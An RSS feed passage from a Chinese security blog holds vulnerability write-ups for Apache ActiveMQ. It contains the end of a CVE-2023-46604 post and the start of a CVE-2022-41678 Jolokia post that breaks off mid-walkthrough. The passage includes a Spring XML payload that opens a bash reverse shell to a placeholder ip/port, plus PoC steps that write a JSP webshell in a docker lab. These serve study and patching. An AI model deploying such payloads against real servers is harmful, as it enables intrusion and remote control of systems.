&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34; ?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;beans&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;xmlns=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.springframework.org/schema/beans&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;na&#34;&gt;xmlns:xsi=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;na&#34;&gt;xsi:schemaLocation=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nt&#34;&gt;&amp;lt;bean&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;pb&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;java.lang.ProcessBuilder&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;init-method=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;start&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nt&#34;&gt;&amp;lt;constructor-arg&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nt&#34;&gt;&amp;lt;list&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;nt&#34;&gt;&amp;lt;value&amp;gt;&lt;/span&gt;bash&lt;span class=&#34;nt&#34;&gt;&amp;lt;/value&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;nt&#34;&gt;&amp;lt;value&amp;gt;&lt;/span&gt;-c&lt;span class=&#34;nt&#34;&gt;&amp;lt;/value&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;nt&#34;&gt;&amp;lt;value&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;![CDATA[bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1]]&amp;gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/value&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nt&#34;&gt;&amp;lt;/list&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nt&#34;&gt;&amp;lt;/constructor-arg&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nt&#34;&gt;&amp;lt;/bean&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;/beans&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
&lt;/h2&gt;&lt;p&gt;建议更新到最新安全版本&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Apache ActiveMQ ≥ 5.18.3&lt;/li&gt;
&lt;li&gt;Apache ActiveMQ ≥ 5.17.6&lt;/li&gt;
&lt;li&gt;Apache ActiveMQ ≥ 5.16.7&lt;/li&gt;
&lt;li&gt;Apache ActiveMQ ≥ 5.15.16&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;附录&#34;&gt;附录
&lt;/h2&gt;&lt;h3 id=&#34;参考文献&#34;&gt;参考文献
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;《&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/12929&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Apache ActiveMQ RCE 分析&lt;/a&gt;》&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;《&lt;a class=&#34;link&#34; href=&#34;https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Apache ActiveMQ CVE-2023-46604 RCE 分析——Boogipop&lt;/a&gt;》&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;《&lt;a class=&#34;link&#34; href=&#34;https://github.com/rootsecdev/CVE-2023-46604&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Achieving a Reverse Shell Exploit for Apache ActiveMQ (CVE_2023-46604)&lt;/a&gt;》&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;《&lt;a class=&#34;link&#34; href=&#34;https://github.com/X1r0z/ActiveMQ-RCE&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ActiveMQ RCE （CVE-2023-46604） 漏洞利用工具&lt;/a&gt;》&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;版权信息&#34;&gt;版权信息
&lt;/h3&gt;&lt;p&gt;本文原载于 &lt;a class=&#34;link&#34; href=&#34;https://ranch007.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Ranch&amp;rsquo;s Blog&lt;/a&gt;，遵循 CC BY-NC-SA 4.0 协议，复制请保留原文出处。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Apache ActiveMQ Jolokia 后台远程代码执行漏洞（CVE 2022 41678）</title>
        <link>http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/</link>
        <pubDate>Sun, 10 Nov 2024 19:11:16 +0800</pubDate>
        
        <guid>http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/</guid>
        <description>&lt;img src="http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/activemq.png" alt="Featured image of post Apache ActiveMQ Jolokia 后台远程代码执行漏洞（CVE 2022 41678）" /&gt;&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;Apache ActiveMQ 是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ActiveMQ中，经过身份验证的用户默认情况下可以通过&lt;code&gt;/api/jolokia/&lt;/code&gt;接口操作MBean，其中FlightRecorder可以被用于写Jsp WebShell，从而造成远程代码执行漏洞。&lt;/p&gt;
&lt;p&gt;FlightRecorder存在于Jdk 11+，具体类名：&lt;code&gt;jdk.management.jfr.FlightRecorderMXBeanImpl&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;影响范围&#34;&gt;影响范围
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Apache ActiveMQ before 5.16.6&lt;/li&gt;
&lt;li&gt;Apache ActiveMQ 5.17.0 before 5.17.4&lt;/li&gt;
&lt;li&gt;Apache ActiveMQ 5.18.0 unaffected&lt;/li&gt;
&lt;li&gt;Apache ActiveMQ 6.0.0 unaffected&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;环境构建&#34;&gt;环境构建
&lt;/h2&gt;&lt;p&gt;在&lt;code&gt;CVE-2022-41678&lt;/code&gt;目录下执行如下命令启动一个Apache ActiveMQ 5.17.3服务器：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker compose up -d
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013103000193.png&#34;
	width=&#34;1113&#34;
	height=&#34;390&#34;
	srcset=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013103000193_hu4780491936100978751.png 480w, http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013103000193_hu7215050145596052825.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;docker启动环境&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;285&#34;
		data-flex-basis=&#34;684px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;服务启动后，访问&lt;code&gt;http://your-ip:8161/&lt;/code&gt;后输入账号密码&lt;code&gt;admin&lt;/code&gt;和&lt;code&gt;admin&lt;/code&gt;，即可成功登录后台。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013103231957.png&#34;
	width=&#34;801&#34;
	height=&#34;360&#34;
	srcset=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013103231957_hu12064188273390494868.png 480w, http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013103231957_hu11704206656534617084.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;访问activeMQ环境&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;222&#34;
		data-flex-basis=&#34;534px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;原理分析&#34;&gt;原理分析
&lt;/h2&gt;&lt;p&gt;漏洞入口在【 &lt;a class=&#34;link&#34; href=&#34;http://localhost:8161/api/jolokia/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://localhost:8161/api/jolokia/&lt;/a&gt;】 ，⚠️注意需要带上Origin头才可以访问&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013120529941.png&#34;
	width=&#34;1254&#34;
	height=&#34;193&#34;
	srcset=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013120529941_hu13778385235790933631.png 480w, http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013120529941_hu12350054906082274268.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;添加Origin头&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;649&#34;
		data-flex-basis=&#34;1559px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;主要问题出在&lt;code&gt;FlightRecorder&lt;/code&gt;这个&lt;code&gt;Mbean&lt;/code&gt;，功能是记录内存，gc，调用栈等。
漏洞用到的方法主要是以下几个：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;newRecording&lt;/code&gt;：新建记录&lt;/li&gt;
&lt;li&gt;&lt;code&gt;setConfiguration&lt;/code&gt;：更改配置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;startRecording&lt;/code&gt;：开始录制&lt;/li&gt;
&lt;li&gt;&lt;code&gt;stopRecording&lt;/code&gt;：结束录制&lt;/li&gt;
&lt;li&gt;&lt;code&gt;copyTo&lt;/code&gt;：导出录制文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;漏洞思路是通过&lt;code&gt;setConfiguration&lt;/code&gt;修改配置，把一些键名改成jsp代码，记录的数据就会包含该jsp代码，录制完成后，通过copyTo导出到web目录即可&lt;/p&gt;
&lt;p&gt;代码位置在 &lt;code&gt;jdk.management.jfr.FlightRecorderMXBeanImpl#setConfiguration&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013122205712.png&#34;
	width=&#34;864&#34;
	height=&#34;730&#34;
	srcset=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013122205712_hu11303952226134364464.png 480w, http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013122205712_hu1024464397283944560.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;可控的代码位置&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;118&#34;
		data-flex-basis=&#34;284px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现&#34;&gt;漏洞复现
&lt;/h2&gt;&lt;p&gt;首先，访问&lt;code&gt;/api/jolokia/list&lt;/code&gt;这个API可以查看当前服务里所有的MBeans：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# 注意需要带上Origin头才可以访问
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Origin:http://192.168.1.3
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013121235613.png&#34;
	width=&#34;1202&#34;
	height=&#34;575&#34;
	srcset=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013121235613_hu168899337351000332.png 480w, http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013121235613_hu13709825686894856645.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;BP抓包修改&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;209&#34;
		data-flex-basis=&#34;501px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这其中有两个点可以被用来执行任意代码。&lt;/p&gt;
&lt;h3 id=&#34;途径一&#34;&gt;途径一
&lt;/h3&gt;&lt;p&gt;第一个方法是使用&lt;code&gt;org.apache.logging.log4j.core.jmx.LoggerContextAdminMBean&lt;/code&gt;，这是由Log4j2提供的一个MBean。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013122644723.png&#34;
	width=&#34;583&#34;
	height=&#34;98&#34;
	srcset=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013122644723_hu58595684267839817.png 480w, http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013122644723_hu3929770757129517420.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Log4j2提供的MBean&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;594&#34;
		data-flex-basis=&#34;1427px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;攻击者使用这个MBean中的&lt;code&gt;setConfigText&lt;/code&gt;操作可以更改Log4j的配置，进而将日志文件写入任意目录中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013122908331.png&#34;
	width=&#34;509&#34;
	height=&#34;99&#34;
	srcset=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013122908331_hu5001832833372914602.png 480w, http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013122908331_hu16951805873583580241.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;可控函数&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;514&#34;
		data-flex-basis=&#34;1233px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;使用【&lt;a class=&#34;link&#34; href=&#34;https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2022-41678/poc.py&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;POC&lt;/a&gt;】脚本来复现完整的过程：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pyhon poc.py -u admin -p admin http://your-ip:8161
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013123035358.png&#34;
	width=&#34;1113&#34;
	height=&#34;144&#34;
	srcset=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013123035358_hu13866367272761762245.png 480w, http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013123035358_hu12579552618965958141.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;poc执行成功并写入shell&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;772&#34;
		data-flex-basis=&#34;1855px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;Webshell被写入在&lt;code&gt;/admin/shell.jsp&lt;/code&gt;文件中：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013123224695.png&#34;
	width=&#34;1298&#34;
	height=&#34;419&#34;
	srcset=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013123224695_hu15961504560005085616.png 480w, http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013123224695_hu16625920705417835606.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;访问写入的shell&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;309&#34;
		data-flex-basis=&#34;743px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这个方法受到ActiveMQ版本的限制，因为&lt;strong&gt;Log4j2是在5.17.0中才引入&lt;/strong&gt;Apache ActiveMQ。&lt;/p&gt;
&lt;h3 id=&#34;途径二&#34;&gt;途径二
&lt;/h3&gt;&lt;p&gt;第二个可利用的Mbean是&lt;code&gt;jdk.management.jfr.FlightRecorderMXBean&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013123659071.png&#34;
	width=&#34;585&#34;
	height=&#34;139&#34;
